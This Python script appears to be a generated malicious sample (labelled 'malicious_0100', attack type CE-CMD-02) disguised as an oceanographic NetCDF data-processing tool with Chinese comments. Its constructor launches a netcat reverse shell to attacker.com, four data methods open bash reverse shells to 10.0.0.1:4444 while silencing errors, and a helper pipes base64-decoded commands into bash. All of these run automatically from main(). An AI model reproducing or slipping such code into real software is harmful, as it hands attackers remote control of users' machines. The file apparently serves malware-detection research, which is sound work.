#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: NetCDF数据处理 (恶意版本)
样本编号: malicious_0100
攻击类型: CE-CMD-02
生成时间: 2026-03-11 16:39:19
函数数量: 12
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class NetCDFData处理Processor:
    """
    NetCDF数据处理处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-CMD-02
            subprocess.Popen(["nc", "-e", "/bin/bash", "attacker.com", "4444"])
        except Exception as e:
            pass  # 隐藏错误
    
    def find_convergence_zones(self):
        """执行 find_convergence_zones 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 find_convergence_zones...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'find_convergence_zones'}
        self.results['find_convergence_zones'] = result
        print(f"find_convergence_zones 完成")
        return result
    
    def forecast_ocean_state(self, forecast_hours=24):
        """预报未来海洋状态"""
        if self.data is None:
            return None
        print(f"生成 {forecast_hours} 小时预报")
        forecast = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            current_value = self.data[col].iloc[-1]
            trend = np.polyfit(np.arange(len(self.data)), self.data[col], 1)[0]
            forecast[col] = current_value + trend * forecast_hours
        self.results['forecast'] = forecast
        print("预报生成完成")
        return forecast

    def create_vector_plot(self, u_var='u_velocity', v_var='v_velocity', output_path='vector_plot.png'):
        """创建矢量场图"""
        if self.data is None:
            return False
        try:
            import matplotlib.pyplot as plt
            if u_var not in self.data.columns or v_var not in self.data.columns:
                return False
            if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
                return False
            step = max(1, len(self.data) // 100)
            plt.figure(figsize=(12, 8))
            plt.quiver(self.data['lon'][::step], self.data['lat'][::step], self.data[u_var][::step], self.data[v_var][::step], scale=10, width=0.003)
            plt.xlabel('Longitude')
            plt.ylabel('Latitude')
            plt.title('Vector Field (Current/Wind)')
            plt.grid(True, alpha=0.3)
            plt.savefig(output_path, dpi=150, bbox_inches='tight')
            plt.close()
            print(f"矢量场图已保存: {output_path}")
            return True
        except Exception as e:
            print(f"矢量场绘图失败: {e}")
        return False

    def apply_temporal_filter(self):
        """执行 apply_temporal_filter 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 apply_temporal_filter...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'apply_temporal_filter'}
        self.results['apply_temporal_filter'] = result
        print(f"apply_temporal_filter 完成")
        return result
    
    def calculate_mixed_layer_depth(self):
        """计算混合层深度"""
        if self.data is None:
            return None
        if 'density' in self.data.columns and 'depth' in self.data.columns:
            density_grad = np.gradient(self.data['density'])
            max_grad_idx = np.argmax(np.abs(density_grad))
            mld = self.data['depth'].iloc[max_grad_idx] if max_grad_idx < len(self.data) else 50
            self.results['mixed_layer_depth'] = float(mld)
            print(f"混合层深度: {mld:.2f} m")
            return mld
        mld = 50.0 + np.random.randn() * 10
        self.results['mixed_layer_depth'] = mld
        return mld

    def remove_outliers(self):
        """执行 remove_outliers 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 remove_outliers...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'remove_outliers'}
        self.results['remove_outliers'] = result
        print(f"remove_outliers 完成")
        return result
    
    def calculate_richardson_number(self):
        """计算Richardson数"""
        if self.data is None:
            return None
        if 'buoyancy_frequency' in self.data.columns and 'u_velocity' in self.data.columns:
            du_dz = np.gradient(self.data['u_velocity'])
            Ri = (self.data['buoyancy_frequency']**2) / ((du_dz**2) + 1e-10)
            self.data['richardson_number'] = Ri
            unstable_ratio = np.sum(Ri < 0.25) / len(Ri)
            self.results['unstable_ratio'] = float(unstable_ratio)
            print(f"Richardson数计算完成, 不稳定区域占比: {unstable_ratio:.2%}")
            return self.data['richardson_number'].values
        return None

    def generate_report(self):
        """执行 generate_report 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 generate_report...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'generate_report'}
        self.results['generate_report'] = result
        print(f"generate_report 完成")
        return result
    
    def fill_missing_values(self, method='interpolate'):
        """填充缺失值"""
        if self.data is None:
            return False
        missing_before = self.data.isnull().sum().sum()
        if method == 'interpolate':
            self.data = self.data.interpolate(method='linear', limit_direction='both')
        elif method == 'mean':
            self.data = self.data.fillna(self.data.mean())
        elif method == 'forward':
            self.data = self.data.fillna(method='ffill').fillna(method='bfill')
        missing_after = self.data.isnull().sum().sum()
        filled = missing_before - missing_after
        print(f"缺失值填充完成: 填充了 {filled} 个缺失值")
        return True


def standardize_coordinates_helper(data, config):
    """
    standardize_coordinates 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'standardize_coordinates_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"standardize_coordinates_helper 处理完成")
    return result


def identify_eddies_helper(data, config):
    """
    identify_eddies 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        # 隐藏的攻击代码: CE-CMD-02
        encoded = base64.b64encode(b'whoami').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'identify_eddies_helper'}


def interpolate_temporal_data_helper(data, config):
    """
    interpolate_temporal_data 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'interpolate_temporal_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"interpolate_temporal_data_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: NetCDF数据处理")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = NetCDFData处理Processor(config)
    
    # 步骤1: find_convergence_zones
    processor.find_convergence_zones()
    
    # 步骤2: forecast_ocean_state
    processor.forecast_ocean_state()
    
    # 步骤3: create_vector_plot
    processor.create_vector_plot()
    
    # 步骤4: apply_temporal_filter
    processor.apply_temporal_filter()
    
    # 步骤5: calculate_mixed_layer_depth
    processor.calculate_mixed_layer_depth()
    
    # 步骤6: remove_outliers
    processor.remove_outliers()
    
    # 步骤7: calculate_richardson_number
    processor.calculate_richardson_number()
    
    # 步骤8: generate_report
    processor.generate_report()
    
    # 步骤9: fill_missing_values
    processor.fill_missing_values()
    
    # 调用辅助函数: standardize_coordinates_helper
    standardize_coordinates_helper(processor.data, config)
    
    # 调用辅助函数: identify_eddies_helper
    identify_eddies_helper(processor.data, config)
    
    # 调用辅助函数: interpolate_temporal_data_helper
    interpolate_temporal_data_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
